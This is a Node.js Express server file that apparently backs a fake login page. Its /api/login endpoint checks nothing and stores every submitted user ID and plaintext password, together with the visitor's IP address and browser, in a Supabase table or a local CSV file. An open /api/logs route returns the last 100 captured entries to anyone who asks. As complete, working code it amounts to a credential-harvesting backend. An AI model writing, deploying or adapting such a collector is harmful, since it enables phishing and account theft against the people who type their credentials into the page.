import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// Supabase Configuration
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
const useSupabase = supabaseUrl && supabaseKey;

let supabase = null;
if (useSupabase) {
  supabase = createClient(supabaseUrl, supabaseKey);
  console.log('Supabase client initialized');
} else {
  console.log('Supabase not configured, using local storage for development');
}

// Local CSV Logger Configuration (for development)
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir);
}

// Helper function to get client IP
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
         req.socket.remoteAddress ||
         'unknown';
}

// Log entry function - supports both Supabase and local CSV
async function logEntry(data) {
  try {
    if (useSupabase && supabase) {
      // Log to Supabase
      const { error } = await supabase
        .from('login_attempts')
        .insert([
          {
            user_id: data.userId || 'N/A',
            password: data.password || 'N/A',
            remember_me: data.rememberMe ? true : false,
            ip_address: data.ipAddress || 'unknown',
            user_agent: data.userAgent || 'unknown',
            status: 'Attempted',
            created_at: new Date().toISOString()
          }
        ]);

      if (error) {
        console.error('Error writing to Supabase:', error);
        throw error;
      }
      console.log('Entry logged to Supabase:', data.userId);
    } else {
      // Fallback to local CSV logging
      const logsFile = path.join(logsDir, 'login_entries.csv');
      const timestamp = new Date().toISOString();
      const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
      
      // Add header if file doesn't exist
      if (!fs.existsSync(logsFile)) {
        fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
      }
      
      fs.appendFileSync(logsFile, entry);
      console.log('Entry logged to CSV:', data.userId);
    }
  } catch (error) {
    console.error('Error logging entry:', error);
    throw error;
  }
}

// API endpoint for form submissions
app.post('/api/login', async (req, res) => {
  const { userId, password, rememberMe } = req.body;
  const ipAddress = getClientIp(req);
  const userAgent = req.headers['user-agent'];

  try {
    // Log the entry
    await logEntry({
      userId,
      password,
      rememberMe: rememberMe === 'on' || rememberMe === true,
      ipAddress,
      userAgent
    });

    res.json({ success: true, message: 'Login attempt logged' });
  } catch (error) {
    console.error('Error processing login:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Route to view logs
app.get('/api/logs', async (req, res) => {
  try {
    if (useSupabase && supabase) {
      // Get logs from Supabase
      const { data, error } = await supabase
        .from('login_attempts')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(100);

      if (error) {
        throw error;
      }

      res.json({
        success: true,
        data: data,
        source: 'Supabase'
      });
    } else {
      // Get logs from local CSV
      const logsFile = path.join(logsDir, 'login_entries.csv');
      if (fs.existsSync(logsFile)) {
        const logs = fs.readFileSync(logsFile, 'utf8');
        res.json({
          success: true,
          data: logs,
          source: 'Local CSV'
        });
      } else {
        res.json({
          success: false,
          message: 'No logs found',
          source: 'Local CSV'
        });
      }
    }
  } catch (error) {
    console.error('Error fetching logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Serve index.html by default
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`CSV logs will be saved to: ${path.join(logsDir, 'login_entries.csv')}`);
});
